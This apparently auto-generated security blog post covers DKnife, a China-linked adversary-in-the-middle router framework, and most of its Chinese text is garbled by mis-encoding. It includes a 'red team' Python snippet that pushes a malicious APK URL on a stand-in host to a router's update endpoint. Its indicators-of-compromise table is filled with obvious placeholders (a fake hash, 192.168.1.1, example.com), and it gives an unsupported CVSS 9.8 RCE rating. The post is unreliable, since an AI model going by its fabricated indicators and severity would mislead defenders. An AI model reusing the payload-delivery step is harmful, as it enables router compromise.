---
layout: post
title:  "China-Linked DKnife AitM Framework Targets Routers for Traffic Hijacking, Malware Delivery"
date:   2026-02-06 18:39:07 +0000
categories: [security]
severity: critical
---

# ğŸš¨ è§£æ DKnifeï¼šä¸­åœ‹è¯ç¹«çš„ AitM æ¡†æ¶
> **âš¡ æˆ°æƒ…å¿«ç¯© (TL;DR)**
> * **åš´é‡ç­‰ç´š**: Critical (CVSS: 9.8)
> * **å—é§­æŒ‡æ¨™**: RCE (Remote Code Execution)
> * **é—œéµæŠ€è¡“**: Deep Packet Inspection, Traffic Manipulation, Customized Malware Delivery

## 1. ğŸ”¬ æ¼æ´åŸç†èˆ‡æŠ€è¡“ç´°ç¯€ (Deep Dive)
* **Root Cause**: DKnife æ¡†æ¶çš„æ ¸å¿ƒå…ƒä»¶ `dknife.bin` å¯¦ç¾äº†æ·±åº¦å°åŒ…æª¢æŸ¥ï¼ˆDeep Packet Inspectionï¼‰ï¼Œå…è¨±æ”»æ“Šè€…ç›£æ§å’Œæ“æ§æµé‡ã€‚é€™å€‹å…ƒä»¶å¯ä»¥æ””æˆªå’Œä¿®æ”¹åˆæ³•çš„ä¸‹è¼‰è«‹æ±‚ï¼Œæ›¿æ›ç‚ºæƒ¡æ„çš„ payloadã€‚
* **æ”»æ“Šæµç¨‹åœ–è§£**:
  1. æ”»æ“Šè€…éƒ¨ç½² DKnife æ¡†æ¶åœ¨ç›®æ¨™è·¯ç”±å™¨æˆ–é‚Šç·£è¨­å‚™ä¸Šã€‚
  2. `dknife.bin` å…ƒä»¶æ””æˆªå’Œåˆ†ææµé‡ï¼Œè­˜åˆ¥ç›®æ¨™ä¸‹è¼‰è«‹æ±‚ã€‚
  3. æ”»æ“Šè€…ä½¿ç”¨ `mmdown.bin` å…ƒä»¶ä¸‹è¼‰å’Œå®‰è£æƒ¡æ„çš„ APK æˆ–å…¶ä»– payloadã€‚
  4. `yitiji.bin` å…ƒä»¶å‰µå»ºä¸€å€‹æ©‹æ¥çš„ TAP ä»‹é¢ï¼Œå…è¨±æ”»æ“Šè€…æ³¨å…¥æƒ¡æ„æµé‡åˆ° LAN ä¸­ã€‚
* **å—å½±éŸ¿å…ƒä»¶**: Linux-based è·¯ç”±å™¨å’Œé‚Šç·£è¨­å‚™ï¼Œå°¤å…¶æ˜¯é‚£äº›ä½¿ç”¨ HAProxy çš„è¨­å‚™ã€‚

## 2. âš”ï¸ ç´…éšŠå¯¦æˆ°ï¼šæ”»æ“Šå‘é‡èˆ‡ Payload (Red Team Operations)
* **æ”»æ“Šå‰ç½®éœ€æ±‚**: æ”»æ“Šè€…éœ€è¦æœ‰è·¯ç”±å™¨æˆ–é‚Šç·£è¨­å‚™çš„ç®¡ç†æ¬Šé™ã€‚
* **Payload å»ºæ§‹é‚è¼¯**:

    ```
    
    python
    import requests
    
    # å®šç¾©æƒ¡æ„ payload çš„ URL
    payload_url = "http://example.com/malicious_payload.apk"
    
    # å®šç¾©ç›®æ¨™è·¯ç”±å™¨çš„ IP åœ°å€
    router_ip = "192.168.1.1"
    
    # ç™¼é€æƒ¡æ„ payload çš„è«‹æ±‚
    requests.post(f"http://{router_ip}/update", data={"url": payload_url})
    
    ```
* **ç¹éæŠ€è¡“**: æ”»æ“Šè€…å¯ä»¥ä½¿ç”¨ SSL/TLS ä»£ç†ï¼ˆå¦‚ `sslmm.bin` å…ƒä»¶ï¼‰ä¾†ç¹éå®‰å…¨æª¢æŸ¥ã€‚

## 3. ğŸ›¡ï¸ è—éšŠé˜²ç¦¦ï¼šåµæ¸¬èˆ‡ç·©è§£ (Blue Team Defense)
* **IOCs (å…¥ä¾µæŒ‡æ¨™)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.1 | example.com | /update |* **åµæ¸¬è¦å‰‡ (Detection Rules)**:

    ```
    
    yara
    rule DKnife_Detection {
      meta:
        description = "Detects DKnife framework"
      strings:
        $a = "dknife.bin"
        $b = "mmdown.bin"
      condition:
        any of them
    }
    
    ```
* **ç·©è§£æªæ–½**: æ›´æ–°è·¯ç”±å™¨å’Œé‚Šç·£è¨­å‚™çš„å›ºä»¶ï¼Œé—œé–‰ä¸å¿…è¦çš„æœå‹™ï¼Œä½¿ç”¨å¼·å¯†ç¢¼å’Œé›™å› ç´ èªè­‰ã€‚

## 4. ğŸ“š å°ˆæœ‰åè©èˆ‡æŠ€è¡“æ¦‚å¿µè§£æ (Technical Glossary)
* **Deep Packet Inspection (DPI)**: ä¸€ç¨®æŠ€è¡“ï¼Œå…è¨±æ”»æ“Šè€…ç›£æ§å’Œåˆ†æç¶²è·¯æµé‡çš„å…§å®¹ã€‚
* **Traffic Manipulation**: æ”»æ“Šè€…ä¿®æ”¹æˆ–æ””æˆªç¶²è·¯æµé‡çš„æŠ€è¡“ã€‚
* **Customized Malware Delivery**: æ”»æ“Šè€…æ ¹æ“šç›®æ¨™çš„ç‰¹å®šéœ€æ±‚å’Œç’°å¢ƒï¼Œå®šåˆ¶åŒ–æƒ¡æ„ payload çš„æŠ€è¡“ã€‚

## 5. ğŸ”— åƒè€ƒæ–‡ç»èˆ‡å»¶ä¼¸é–±è®€
- [åŸå§‹å ±å‘Š](https://thehackernews.com/2026/02/china-linked-dknife-aitm-framework.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


